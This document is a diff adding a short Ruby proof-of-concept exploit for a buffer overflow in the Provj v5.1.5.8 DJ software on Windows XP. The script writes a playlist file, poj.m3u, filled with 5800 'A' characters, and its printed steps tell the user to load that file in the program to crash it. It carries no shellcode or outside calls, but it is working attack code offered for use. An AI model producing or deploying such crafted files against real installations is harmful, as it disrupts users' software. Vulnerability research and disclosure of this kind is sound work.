@@ -1,0 +1,19 @@
+#!/usr/bin/env ruby
+# coding:UTF-8
+# Exploit Title:Provj v5.1.5.8 Buffer Overflow (Poc)
+# Author:Necmettin COSKUN => twitter.com/babayarisi
+# Vendor :http://www.clubdjpro.com
+# Software link:http://www.clubdjpro.com/files/provj5.exe
+# version: v5.1.5.8
+# Tested on: windows XP sp2
+
+puts "1.Start Program With Trial Mode"
+puts "2.Load Playlist .m3u"
+puts "3.Don't be evil"
+
+KESST = "A" * 5800
+
+File.open('poj.m3u', 'w') do |bofdosya|  
+bofdosya.puts (KESST)
+bofdosya.close()
+end
